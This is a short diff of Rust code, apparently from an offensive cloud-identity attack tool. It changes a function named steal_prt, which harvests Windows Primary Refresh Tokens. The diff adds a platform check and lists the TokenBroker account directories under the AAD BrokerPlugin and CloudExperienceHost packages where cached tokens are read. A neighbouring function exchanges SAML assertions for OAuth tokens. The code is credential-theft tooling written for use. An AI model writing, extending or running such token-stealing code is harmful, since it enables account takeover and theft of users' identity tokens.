@@ -763,10 +763,21 @@ async fn exchange_saml_for_oauth(saml_assertion: &str, tenant: &str) -> Result<V
 // ═══════════════════════════════════════════════════════════
 
 async fn steal_prt() -> Result<Vec<String>> {
+    #[cfg(not(target_os = "windows"))]
+    {
+        warn!("PRT theft requires Windows with TokenBroker plugin");
+        return Err(OverthroneError::custom(
+            "PRT theft is only supported on Windows",
+        ));
+    }
+
+    #[allow(unused_mut, unused_variables)]
     let mut creds = Vec::new();
 
     #[cfg(target_os = "windows")]
     {
+        let mut creds = Vec::new();
+
         let broker_paths = [
             r"Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\LocalState\TokenBroker\Accounts",
             r"Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\LocalState\TokenBroker\Accounts",
